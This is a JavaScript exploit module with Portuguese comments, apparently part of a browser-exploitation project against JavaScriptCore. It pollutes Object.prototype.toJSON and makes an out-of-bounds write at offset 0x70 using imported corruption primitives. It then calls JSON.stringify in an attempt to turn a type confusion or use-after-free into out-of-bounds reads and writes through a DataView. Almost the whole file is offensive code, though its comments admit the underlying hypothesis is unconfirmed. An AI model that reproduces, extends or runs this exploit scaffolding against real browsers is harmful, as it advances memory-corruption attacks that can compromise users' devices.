// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const CRITICAL_PARAMS = {
    victim_ab_size: 64, // Tamanho original do victim_ab
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "TypeConfusionExploitAttempt_0x70_FFFF"
};

let callCount_toJSON_tc_exploit = 0;

// toJSON Modificada para explorar 'this' como ArrayBuffer
function typeConfusionExploit_toJSON() {
    const FNAME_toJSON_local = "typeConfusionExploit_toJSON_Internal"; 
    callCount_toJSON_tc_exploit++;
    document.title = `TC_toJSON Call ${callCount_toJSON_tc_exploit}`;

    const currentOperationThis = this; // Este 'this' é suspeito de ser o victim_ab (ArrayBuffer)
    logS3(`[${CRITICAL_PARAMS.ppKey} Poluído - TC Exploit] Chamada ${callCount_toJSON_tc_exploit}!`, "vuln", FNAME_toJSON_local);
    logS3(`  [CALL ${callCount_toJSON_tc_exploit}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info", FNAME_toJSON_local);
    logS3(`  [CALL ${callCount_toJSON_tc_exploit}] Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info", FNAME_toJSON_local);

    let exploitation_details = {
        observed_byteLength: "N/A",
        dataview_created: false,
        oob_read_attempt_offset: 0x1000, // Tentar ler bem longe
        oob_read_value: "N/A",
        oob_write_attempt_offset: 0x1000,
        oob_write_success: false
    };

    try {
        exploitation_details.observed_byteLength = currentOperationThis.byteLength;
        logS3(`  [CALL ${callCount_toJSON_tc_exploit}] this.byteLength observado: ${exploitation_details.observed_byteLength}`, "leak", FNAME_toJSON_local);

        // Se byteLength for um número e parecer grande (ou diferente do original 64), é um bom sinal
        if (typeof exploitation_details.observed_byteLength === 'number' && exploitation_details.observed_byteLength > CRITICAL_PARAMS.victim_ab_size) {
            logS3(`  [CALL ${callCount_toJSON_tc_exploit}] !!! POTENCIAL TYPE CONFUSION / UAF !!! this.byteLength (${exploitation_details.observed_byteLength}) > original (${CRITICAL_PARAMS.victim_ab_size})`, "vuln", FNAME_toJSON_local);
            document.title = `TC DETECTED? this.byteLength=${exploitation_details.observed_byteLength}`;
        }

        // Tentar usar 'this' como um ArrayBuffer para criar uma DataView
        // Mesmo que this.byteLength seja 64, a corrupção OOB pode ter alterado o ponteiro de dados interno.
        if (currentOperationThis instanceof ArrayBuffer || typeof exploitation_details.observed_byteLength === 'number') {
            logS3(`  [CALL ${callCount_toJSON_tc_exploit}] Tentando criar DataView sobre 'this' (tamanho observado: ${exploitation_details.observed_byteLength})...`, "info", FNAME_toJSON_local);
            try {
                // Usar um tamanho seguro para a DataView inicialmente, ou o byteLength observado se for número
                let dv_size = typeof exploitation_details.observed_byteLength === 'number' ? exploitation_details.observed_byteLength : 0;
                if (dv_size === 0 && currentOperationThis instanceof ArrayBuffer) dv_size = CRITICAL_PARAMS.victim_ab_size; // Fallback se byteLength não for número mas é AB

                if (dv_size > 0) {
                    // CUIDADO: Se currentOperationThis não for REALMENTE um ArrayBuffer, isso pode crashar aqui mesmo.
                    // Ou se for um AB mas com ponteiro de dados corrompido.
                    let confused_dv = new DataView(currentOperationThis, 0, dv_size); 
                    exploitation_details.dataview_created = true;
                    logS3(`  [CALL ${callCount_toJSON_tc_exploit}] DataView criada sobre 'this' com tamanho ${confused_dv.byteLength}.`, "good", FNAME_toJSON_local);

                    // Tentar leitura OOB (relativo ao victim_ab, se o tamanho foi corrompido para maior)
                    if (confused_dv.byteLength > exploitation_details.oob_read_attempt_offset + 3) {
                        exploitation_details.oob_read_value = confused_dv.getUint32(exploitation_details.oob_read_attempt_offset, true);
                        logS3(`  [CALL ${callCount_toJSON_tc_exploit}] LEITURA OOB de 'this' @ ${toHex(exploitation_details.oob_read_attempt_offset)}: ${toHex(exploitation_details.oob_read_value)}`, "leak", FNAME_toJSON_local);
                        document.title = `OOB Read OK: ${toHex(exploitation_details.oob_read_value)}`;
                    } else {
                        logS3(`  [CALL ${callCount_toJSON_tc_exploit}] Tamanho da DataView confusa (${confused_dv.byteLength}) não permite leitura em ${toHex(exploitation_details.oob_read_attempt_offset)}.`, "info", FNAME_toJSON_local);
                    }

                    // Tentar escrita OOB
                    if (confused_dv.byteLength > exploitation_details.oob_write_attempt_offset + 3) {
                        confused_dv.setUint32(exploitation_details.oob_write_attempt_offset, 0xDEADBEEF, true);
                        let readback = confused_dv.getUint32(exploitation_details.oob_write_attempt_offset, true);
                        if (readback === 0xDEADBEEF) {
                            exploitation_details.oob_write_success = true;
                            logS3(`  [CALL ${callCount_toJSON_tc_exploit}] ESCRITA OOB em 'this' @ ${toHex(exploitation_details.oob_write_attempt_offset)} VERIFICADA!`, "critical", FNAME_toJSON_local);
                            document.title = "OOB WRITE SUCCESS!";
                        }
                    }
                } else {
                     logS3(`  [CALL ${callCount_toJSON_tc_exploit}] Não foi possível determinar tamanho seguro para DataView sobre 'this'.`, "warn", FNAME_toJSON_local);
                }
            } catch (e_dv_confused) {
                logS3(`  [CALL ${callCount_toJSON_tc_exploit}] ERRO ao criar/usar DataView em 'this': ${e_dv_confused.message}`, "error", FNAME_toJSON_local);
                exploitation_details.dataview_created = `Erro: ${e_dv_confused.message}`;
                document.title = "ERRO DataView em 'this'";
            }
        }
        return { toJSON_TC_exploit_attempt: true, call: callCount_toJSON_tc_exploit, exploitation_details: exploitation_details };
    } catch (e) {
        logS3(`  [CALL ${callCount_toJSON_tc_exploit}] ERRO GERAL em typeConfusionExploit_toJSON: ${e.message}`, "critical", FNAME_toJSON_local);
        document.title = `ERRO GERAL toJSON Call ${callCount_toJSON_tc_exploit}`;
        return { toJSON_TC_error: true, message: e.message, call: callCount_toJSON_tc_exploit };
    }
}

export async function runTypeConfusionExploitAttempt() {
    const FNAME = CRITICAL_PARAMS.description; 
    logS3(`--- Iniciando Tentativa de Exploração de Type Confusion: ${FNAME} ---`, "test", FNAME);
    document.title = "Iniciando Tentativa Exploração TC - " + FNAME;

    callCount_toJSON_tc_exploit = 0;
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME); return;
    }
    document.title = "OOB OK - " + FNAME;

    // Este victim_ab é o que esperamos que 'this' se torne dentro da toJSON
    let victim_ab_for_this_context = new ArrayBuffer(CRITICAL_PARAMS.victim_ab_size);
    logS3(`victim_ab_for_this_context (${CRITICAL_PARAMS.victim_ab_size}b) criado.`, "info", FNAME);

    // O objeto que será efetivamente passado para JSON.stringify (um objeto simples)
    let object_to_stringify = { simple_prop: "trigger_toJSON" };
    logS3(`object_to_stringify criado: ${JSON.stringify(object_to_stringify)}`, "info", FNAME);


    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CRITICAL_PARAMS.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${CRITICAL_PARAMS.ppKey} com typeConfusionExploit_toJSON...`, "info", FNAME);
        document.title = "Aplicando PP Exploit - " + FNAME;
        Object.defineProperty(Object.prototype, CRITICAL_PARAMS.ppKey, {
            value: typeConfusionExploit_toJSON,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com typeConfusionExploit_toJSON.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = "PP Exploit OK - " + FNAME;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(CRITICAL_PARAMS.value_to_write)} @ ${toHex(CRITICAL_PARAMS.corruption_offset)}`, "warn", FNAME);
        document.title = "Antes OOB Write Exploit - " + FNAME;
        oob_write_absolute(CRITICAL_PARAMS.corruption_offset, CRITICAL_PARAMS.value_to_write, CRITICAL_PARAMS.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = "Após OOB Write Exploit - " + FNAME;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify_obj_simples";
        document.title = `Antes Stringify Obj Simples - ${FNAME}`;
        logS3(`Chamando JSON.stringify para object_to_stringify (esperando que 'this' na toJSON seja victim_ab_for_this_context)...`, "info", FNAME);
        let stringifyResult = null;
        try {
            // JSON.stringify será chamado no object_to_stringify. 
            // A toJSON poluída será chamada com this=object_to_stringify na 1a vez,
            // e depois com os resultados dela.
            // A hipótese de this ser victim_ab_for_this_context estava baseada no debugger. Precisamos confirmar isso.
            // Para o teste atual, this DENTRO de toJSON será object_to_stringify.
            // O objetivo é que a corrupção OOB afete como ArrayBuffer (o tipo de victim_ab_for_this_context)
            // ou Object.prototype é manuseado.
            stringifyResult = JSON.stringify(object_to_stringify); 
            stepReached = `apos_stringify_obj_simples`;
            document.title = `Strfy Obj Simples OK - ${FNAME}`;
            logS3(`Resultado JSON.stringify(object_to_stringify): ${String(stringifyResult).substring(0, 300)}... (Chamadas toJSON: ${callCount_toJSON_tc_exploit})`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify_obj_simples`;
            document.title = `ERRO Strfy Obj Simples - ${FNAME}`;
            logS3(`ERRO JSON.stringify(object_to_stringify): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_toJSON_tc_exploit})`, "critical", FNAME);
            console.error(`JSON.stringify ERROR for object_to_stringify:`, e);
        }
    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal Exploit TC - " + FNAME;
        console.error("Main TC exploit test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CRITICAL_PARAMS.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[CRITICAL_PARAMS.ppKey];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME);
         if (stepReached !== "apos_stringify_obj_simples" && !stepReached.startsWith("erro_")) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`;
        }
    }
    logS3(`--- Tentativa de Exploração de Type Confusion Concluída: ${FNAME} ---`, "test", FNAME);
}

// Para ser chamado por runAllAdvancedTestsS3.mjs
export async function testJsonTypeConfusionUAFSpeculative() {
    await runTypeConfusionExploitAttempt();
}
